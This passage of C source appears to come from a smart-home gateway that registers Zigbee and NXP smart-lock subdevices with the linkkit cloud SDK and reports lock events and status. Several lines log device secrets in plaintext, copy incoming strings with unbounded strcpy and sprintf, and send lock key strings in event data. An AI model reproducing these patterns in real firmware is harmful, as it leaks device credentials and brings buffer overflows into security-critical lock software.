	stSubDevCfg_t *sdc = product_sub_get_subdev_cfg_by_model(model_id_str);
	if (sdc == NULL) {
		log_warn("can't find subdev config for model %s", model_id_str);
		return;
	}

	log_info("productKey: %s, deviceName:%s, deviceSecret:%s", sdc->productKey, sdc->deviceName, sdc->deviceSecret);
	int ret = linkkit_gateway_subdev_register(sdc->productKey, sdc->deviceName, sdc->deviceSecret);
	if (ret < 0) {
		log_warn("linkkit gateway subdev register failed: ret(%d), key(%s),name(%s), secret(%s)",
				ret, sdc->productKey, sdc->deviceName, sdc->deviceSecret);
		return;
	}
	log_info("register ret %d", ret);

	ret = linkkit_gateway_subdev_create(sdc->productKey, sdc->deviceName, &dev_cbs, sdc);
	if (ret < 0) {	
		log_warn("linkkit gateway create subdev failed: pKey(%s), pName(%s)", sdc->productKey, sdc->deviceName);
		return;
	}
	log_info("create ret %d, devId -> ret -> %d", ret, ret);

	int subdev_id = ret;
	ret = product_sub_new_subdev((char *)ieee_addr, model_id_str, sdc, subdev_id); 
	if (ret != 0) {
		log_warn("new subdev failed : %d", ret);
		linkkit_gateway_subdev_destroy(subdev_id);
		return;
	}

	log_info("New Sub Dev OK : ieee(%s), model(%s), id(%d)", ieee_addr_str, model_id_str, subdev_id);
#endif
}

void	afly_z3_unreg(unsigned char ieee_addr[IEEE_ADDR_BYTES]) {
	char ieee_addr_str[32];
	hex_string(ieee_addr_str, sizeof(ieee_addr_str), (u8*)ieee_addr, IEEE_ADDR_BYTES, 0, 0);

	log_info("unregister : %s", ieee_addr_str);

#if 0
	stSubDev_t *dev = product_sub_get_subdev_by_ieee((char *)ieee_addr);
	if (dev == NULL) {
		log_warn("not exsit dev: %s", ieee_addr_str);
		return;
	}

	int ret = linkkit_gateway_subdev_destroy(dev->devid);
	if (ret != 0) {
		log_warn("linkkit_gateway_subdev_destroy failed, ret:%d, id: %d, mac:(%s)", ret, dev->devid, ieee_addr_str);
		return;
	}
	log_info("destroy ret %d", ret);

	ret = linkkit_gateway_subdev_unregister(dev->productKey, dev->deviceName);
	if (ret != 0) {
		log_warn("linkkit_gateway_subdev_unregister failed, ret:%d, id: %d, mac:(%s)", ret, dev->devid, ieee_addr_str);
		return;
	}
	log_info("unregister ret %d", ret);

	product_sub_del_subdev_by_ieee((char *)ieee_addr);

	log_info("delete subdev : %s ok", ieee_addr_str);
#endif
}

void	afly_z3_upt_online(unsigned char ieee_addr[IEEE_ADDR_BYTES], char online_or_not) {
	char ieee_addr_str[32];
	hex_string(ieee_addr_str, sizeof(ieee_addr_str), (u8*)ieee_addr, IEEE_ADDR_BYTES, 0, 0);

	log_info("update online : %s->%d", ieee_addr_str, online_or_not);

#if 0
	int subdev_id = product_sub_get_subdev_id_by_ieee((char *)ieee_addr);
	if (subdev_id < 0) {
		log_warn("not exsit dev: %s", ieee_addr_str);
		return;
	}

	int ret = 0;
	if (online_or_not) {
		log_info("login ...");
		ret = linkkit_gateway_subdev_login(subdev_id);
	} else {
		log_info("login out...");
		ret = linkkit_gateway_subdev_logout(subdev_id);
	}

	log_info("update ret:%d", ret);
#endif
}

void	afly_z3_rpt_attrs(unsigned char ieee_addr[IEEE_ADDR_BYTES], unsigned char endpoint_id, const char *attr_name[], const char *attr_value[]) {
	log_info("report attr : Name:%s, Value:%s", attr_name[0], attr_value[0]);

#if 0
	/*
		 int ret = afly_zigbee_report_attrs((unsigned char *)ieee_addr, endpoint_id, attr_name, attr_value);
		 log_info("report ret : %d", ret);


		 linkkit_gateway_post_property_json_sync
		 linkkit_gateway_post_property_json()
		 */
#endif
}

void	afly_z3_rpt_event(unsigned char ieee_addr[IEEE_ADDR_BYTES], unsigned char endpoint_id, const char *event_name, const char *event_args) {
	log_info("report cmd : %s", event_name);

	/*
		 int ret = afly_zigbee_report_event((unsigned char *)ieee_addr, endpoint_id,  event_name, event_args);
		 log_info("report ret : %d", ret);

		 linkkit_gateway_trigger_event_json_sync();
		 linkkit_gateway_trigger_event_json();
		 */
}



// NXP

static int afly_nxp_report_all_status(stSubDev_t *sd) {
	
	json_t *jarg = json_object();
	json_object_set_new(jarg,		"BatteryPercentage",json_integer(sd->battery));
	//json_object_set_new(jarg, "LockState",				json_integer(sd->aset.lock.lock_status));
	json_object_set_new(jarg,		"LinkType",					json_string(sd->app));
	json_object_set_new(jarg,		"Version",					json_string(sd->version));
	json_object_set_new(jarg,		"Model",						json_string(sd->model));
	const char *sarg = json_dumps(jarg, 0);

	int ret = -1;
	if (sarg != NULL) {
		log_info("post property: %s", sarg);
		ret = linkkit_gateway_post_property_json_sync(sd->devid, (char *)sarg, 10000);
		log_info("post ret:%d", ret);
	}

	return ret;
}


void  afly_nxp_reg(const char *name, const char *model, const char *type, const char *version, int battery, int online, int rssi, int dev_added) {
	log_info("register %s, model:%s, type:%s, version:%s, battery:%d, online:%d, rssi:%d", 
			name, model, type, version, battery, online, rssi);

	stSubDev_t *sd = product_sub_search_by_name(name);
	if (sd == NULL) {
		log_warn("can't find this(%s) device in device list", name);
		return;
	}

	/*
		 if (strncmp(model, "1203", 4) != 0 ||
		 (strncmp(type, "0008") != 0 && strncmp(type,"0009") != 0) ) {
		 log_warn("not support dev model or type: %s", model, type);
		 return;
		 }
		 */

	log_info("deviceName:%s, productKey: %s,  deviceSecret:%s", sd->deviceName, sd->productKey, sd->deviceSecret);

	if (sd->devid == 0) {
		int ret = linkkit_gateway_subdev_register(sd->productKey, sd->deviceName, sd->deviceSecret);
		if (ret < 0) {
			log_warn("linkkit gateway subdev register failed: ret(%d[%08x]) key(%s),name(%s), secret(%s)",
					ret, ret, sd->productKey, sd->deviceName, sd->deviceSecret);
			return;
		}
		log_info("register ret %d(%08x)", ret, ret);

		ret = linkkit_gateway_subdev_create(sd->productKey, sd->deviceName, &dev_cbs, sd);
		if (ret < 0) {	
			log_warn("linkkit gateway create subdev failed: pKey(%s), pName(%s), unregisert it...",
					sd->productKey, sd->deviceName);
			linkkit_gateway_subdev_unregister(sd->productKey, sd->deviceName);
			return;
		}
		log_info("create ret %d(%08x), devId -> ret -> %d", ret, ret, ret);
		sd->devid = ret;

		log_info("New Sub Dev : ieee(%s), model(%s), id(%d)", name, model, sd->devid);
	} 


	sd->battery = battery;
	sd->online = online;
	strcpy(sd->type, type);
	strcpy(sd->version, version);
	strcpy(sd->model, model);
	strcpy(sd->app, "NXP");
	sd->rssi = rssi;

	int ret = product_sub_save(sd, 0, sizeof(*sd));
	if (ret != 0) {
		log_warn("product_sub_save failed: %d", ret);
	} else {
		log_info("Save New Data: %d", ret);
	}

	if (!sd->dynamic) {
		//nxp_lock_add_dynamic(const char *macstr);
	}
	


	if (online) {
		if (sd->login == 0) {
			log_info("login...");
			ret = linkkit_gateway_subdev_login(sd->devid);
			log_info("login result is %d", ret);
			sd->login = ret == 0 ? 1 : 0;
		} else {
			;
		}
	} else {
		log_info("login out...");
		if (sd->login != 0) {
			ret = linkkit_gateway_subdev_logout(sd->devid);
			log_info("login result is %d", ret);
			sd->login = ret == 0 ? 0 : 1;
		}
	}

	if (sd->login) {
		log_info("post %s all status...", sd->deviceName);
		int ret = afly_nxp_report_all_status(sd);
		log_info("post ret : %d", ret);
	} else {
		;
	}

}

void afly_nxp_unreg(const char *name) {
	log_info("unregister %s", name);

	stSubDev_t *sd = product_sub_search_by_name((char *)name);
	if (sd == NULL) {
		log_warn("not exsit dev: %s", name);
		return;
	}

	if (sd->devid == 0) {
		log_warn("not reigstered dev, !!!");
		return;
	}

	int ret = linkkit_gateway_subdev_destroy(sd->devid);
	if (ret != 0) {
		log_warn("linkkit_gateway_subdev_destroy failed, ret:%d(%08x), id: %d, mac:(%s)", ret, ret, sd->devid, name);
		return;
	}
	log_info("destroy ret %d", ret);

	ret = linkkit_gateway_subdev_unregister(sd->productKey, sd->deviceName);
	if (ret != 0) {
		log_warn("linkkit_gateway_subdev_unregister failed, ret:%d(%08x), id: %d, mac:(%s)", ret, ret, sd->devid, name);
		return;
	}
	log_info("unregister ret %d", ret);

	product_sub_empty(sd);
	ret = product_sub_save(sd, 0, sizeof(*sd));
	if (ret != 0) {
		log_warn("product_sub_save failed: %d", ret);
	} 

	log_info("delete subdev : %s ok", name);
}

void	afly_nxp_upt_online(const char *name, int online, const char *type, int battery, 
		int passNum, int passAll, int cardNum, int cardAll, int fingNum, int fingAll, int rssi) { 

	log_info("rpt online %s, online:%d, type:%s, battery:%d,"
			" passNum:%d, passAll:%d, cardNum:%d, cardAll:%d, fingNum:%d, fingAll:%d, rssi:%d",
			name, online, type, battery, passNum, passAll, cardNum, cardAll, fingNum, fingAll, rssi);

	stSubDev_t *sd = product_sub_search_by_name((char *)name);
	if (sd == NULL) {
		log_warn("not exsit dev: %s", name);
		return;
	}

	if (sd->devid == 0) {
		log_warn("not reigstered dev, !!!");
		return;
	}

	sd->online = online;
	//strcpy(sd->type, type);
	sd->battery = battery;
	if (strncmp(type, "1203", 4) == 0) {
		sd->aset.lock.passNum = passNum;
		sd->aset.lock.passAll = passAll;
		sd->aset.lock.cardNum = cardNum;
		sd->aset.lock.cardAll = cardAll;
		sd->aset.lock.fingNum = fingNum;
		sd->aset.lock.fingAll = fingAll;
	}
	sd->rssi		= rssi;

	product_sub_save(sd, 0, sizeof(*sd));

	int ret = 0;
	if (sd->online) {
		if (sd->login == 0) {
			log_info("login ...");
			ret = linkkit_gateway_subdev_login(sd->devid);
			sd->login = ret == 0 ? 1 : 0;
		} else {
			;
		}
	} else {
		if (sd->login != 0) {
			log_info("login out...");
			ret = linkkit_gateway_subdev_logout(sd->devid);
			sd->login = ret == 0 ? 0 : 1;
			} else {
			;
		}
	}

	if (sd->login) {
		log_info("post %s all status...", sd->deviceName);
		int ret = afly_nxp_report_all_status(sd);
		log_info("post ret : %d", ret);
	} else {
		;
	}


	log_info("upt online(login) ret:%d(%08X)", ret, ret);
}

void afly_nxp_rpt_attrs() {
	log_info("-");
}


static void subdev_timeout_func(void *arg) {
	stSubDev_t *sd = (stSubDev_t*)arg;
	sd->aset.lock.lock_status = 0;
	int ret = linkkit_gateway_post_property_json_sync(sd->devid, "{\"LockState\": 0}", 10000);
	log_info("post LockState propety(%d), ret:%d", 0,  ret);
}
void afly_nxp_rpt_event(const char *name, int eid, char *buf, int len) {
	/**
	 * EVENT_NXP_NONE					= 0x00,
	 * EVENT_NXP_REBOOT				= 0x01,			NULL, 0
	 * EVENT_NXP_FACTORY_RESET = 0x02,		NULL, 0
	 * EVENT_NXP_CHECK_RECORD  = 0x03,		passType, pass, time, passId, passVal1,
	 * EVENT_NXP_ADD_DEL_PASS_RET = 0x04, opadd, passId, code
	 * EVENT_NXP_MOD_PASS_RET	= 0x05,			opadd, passId, code
	 * EVENT_NXP_DAMAGE_ALARM	= 0x06,			alarmStatus, time
	 * EVENT_NXP_SYS_STATUS		= 0x07,			locked, lowpower
	 * */

	/**
	 * 0008/0009 : 0x02, 0x03, 0x04, 0x05, 0x07 
	 * */

	static const char *estr[] = {
		"EVENT_NXP_NONE", 
		"EVENT_NXP_REBOOT",
		"EVENT_NXP_FACTORY_RESET",
		"EVENT_NXP_CHECK_RECORD(passType, pass, time, passId, passVal1)",
		"EVENT_NXP_ADD_DEL_PASS_RET(op, passId, code)",
		"EVENT_NXP_MOD_PASS_RET(op, passId, code)",		
		"EVENT_NXP_DAMAGE_ALARM(alarmStatus, time)",
		"EVENT_NXP_SYS_STATUS(locked, lowpower)",
	};

	log_info("%s, eid:%d(%s), ", name, eid, estr[eid%(sizeof(estr)/sizeof(estr[0]))] );
	log_debug_hex("buf :", buf, len);

	stSubDev_t *sd = product_sub_search_by_name((char *)name);
	if (sd == NULL) {
		log_warn("not exsit dev: %s", name);
		return;
	}

	static const char *identifier_array[] = {
		"none",
		"reboot",
		"factory_reset",
		"check_record",
		"add_pass_del_pass",
		"mod_pass",
		"damage_alarm",
		"sys_status",
	};

	char *identifier = NULL;
	json_t *je = NULL;
	int timeout = 10000; //100ms

	switch (eid) {
		default:
			log_warn("not support event id:%d", eid);
			break;

		case EVENT_NXP_NONE:
			log_warn("not support event id:%d", eid);
			break;

		case EVENT_NXP_REBOOT:
			/**> 0008/0009 no such message */
			break;

		case EVENT_NXP_FACTORY_RESET:
			/**> 0008/0009 no such message */
			/**> no need to do deal this message */
			break;

		case EVENT_NXP_CHECK_RECORD: 			
			//DoorOpenNotification, KeyId, LockType
			{
				int *p = (int*)buf;
				int passType = p[0];
				int pass = p[1];
				int time = p[2];
				int passId = p[3];
				//int passVal1 = p[4];

				int type = 0;
				if (passType == 0) { //暂时只支持密码类型
					type = 2;
				} else if (passType == 11) { // 卡 
					type = 3;
				} else if (passType == 21) { // 指纹
					type = 1;
				} else {
					log_warn("not support check record type!");
					return;
				};

				stLockKey_t *key = product_sub_lock_get_key_by_id(sd, type, passId);
				if (key == NULL || key->key_state != KEY_STATE_ADDED) {
					log_warn("not found key in gateway!!");
					return;
				}

				char KeyID[32]; sprintf(KeyID, "%d", key->id);
				int LockType = type;

				if (pass == 1) {
					identifier = "DoorOpenNotification";
					je = json_object();			
					json_object_set_new(je, "KeyID", json_string(KeyID));
					json_object_set_new(je, "LockType", json_integer(LockType));
					
					sd->aset.lock.lock_status = 1;
					int ret = linkkit_gateway_post_property_json_sync(sd->devid, "{\"LockState\": 1 }", 10000);
					log_info("post LockState propety(%d), ret:%d", 1,  ret);

					schedue_add(&sd->task, 5000, subdev_timeout_func, sd);
					int delt = schedue_first_task_delay();
					timer_set(env.th, &env.task_timer, delt);

				} else {
					log_info("open door failed: LockType(%d), time(%d), KeyID(%s)", 
							LockType, time, KeyID);
				}
			}
			break;

		case EVENT_NXP_ADD_DEL_PASS_RET: 
			//KeyDeletedNotification/KeyAddedNotification, KeyID, LockType, UserLimit
			{
				int *p = (int*)buf;
				int op = p[0];
				int passId = p[1];
				int code = p[2];

				int type = 0;
				if (passId >= 2000000 && passId < 3000000) { //暂时只支持密码类型
					type = 2;
				} else if (passId >= 3000000 && passId < 4000000) { // 卡 
					type = 3;
				} else if (passId >= 1000000 && passId < 2000000) { // 指纹
					type = 1;
				} else if (passId != 0){
					log_warn("not support check record type!");
					return;
				};

				
				if (passId == 0) {
					product_sub_lock_clr_key(sd, type);
					identifier = "ClearKeyNotifycation";
					type = 2;
					int LockType = type;
					je = json_object();			
					json_object_set_new(je, "LockType", json_integer(LockType));

					break;
				}

				stLockKey_t *key = product_sub_lock_get_key_by_id(sd, type, passId);
				if (key == NULL) {
					log_warn("not found key in gateway!!");
					return;
				}
				if (!( (key->key_state == KEY_STATE_ADDING && op == 1) ||
							 (key->key_state == KEY_STATE_ADDED  && op == 0) ) ){
					log_warn("not correct pass add/devl operation, op:%d, passId:%d, code:%d", op, passId, code);
					return;
				}


				char KeyID[32]; sprintf(KeyID, "%d", passId);
				int LockType = type;
				int UserLimit = key->limit;
				char KeyStr[64]; snprintf(KeyStr, key->len+1, "%s", key->buf);
				

				if (code == 0) {
					if (op == 1) {
						product_sub_lock_add_key_complete(sd, type, passId);

						identifier = "KeyAddedNotification";
						je = json_object();			
						json_object_set_new(je, "KeyID",		json_string(KeyID));
						json_object_set_new(je, "LockType", json_integer(LockType));
						json_object_set_new(je, "UserLimit",json_integer(UserLimit));
						json_object_set_new(je, "KeyStr",	json_string(KeyStr));
					} else if (op == 0) {
						product_sub_lock_del_key(sd, type, passId);

						identifier = "KeyDeletedNotification";
						je = json_object();			
						json_object_set_new(je, "KeyID", json_string(KeyID));
						json_object_set_new(je, "LockType", json_integer(LockType));
					}
				} else {
					log_info("add/del pass failed: op:%d, LockType:%d, KeyID:%s", op, LockType, KeyID);
				}

			}
			break;

		case EVENT_NXP_DAMAGE_ALARM:
			/**> 0008/0009 no such message */
			{
				int *p = (int*)buf;
				int alarmStatus = p[0];
				int time = p[1];
				log_info("damage alarm, alarmStatus:%d, time:%d", alarmStatus, time);
			}
			break;

		case EVENT_NXP_SYS_STATUS:
			//HijackingAlarm, TamperAlarm, LowElectricityAlarm, DoorUnlockedAlarm, Error
			{
				int *p = (int*)buf;
				int locked = p[0];
				int lowpower = p[1];
				
				if (locked) {
					identifier = "Error";
					int errcode = 0;
				je = json_object();			
					json_object_set_new(je, "ErrorCode", json_integer(errcode));
				} else if (lowpower) { 
					identifier = "LowElectricityAlarm";
					je = json_object();			
				}
			}
			break;
	}

	if (identifier == NULL) {
		log_info("no need to deal this message!");
		return;
	}

	char *sje = NULL;
	if (je != NULL) {
		sje = json_dumps(je, 0);
		if (sje == NULL) {
			log_warn("No More Memory!");
			json_decref(je);
			return;
		}
	} else {
		sje = "";
	}

	/**> Must wait device has login ok */
	log_info("send event %s(%s)", identifier, sje);
	int ret = linkkit_gateway_trigger_event_json_sync(sd->devid, identifier, (char *)sje, timeout);
	log_info("trigger_event_sync ret: %d(%08X)", ret, ret);

	if (je != NULL) {
		free(sje);
		json_decref(je);
	}
}

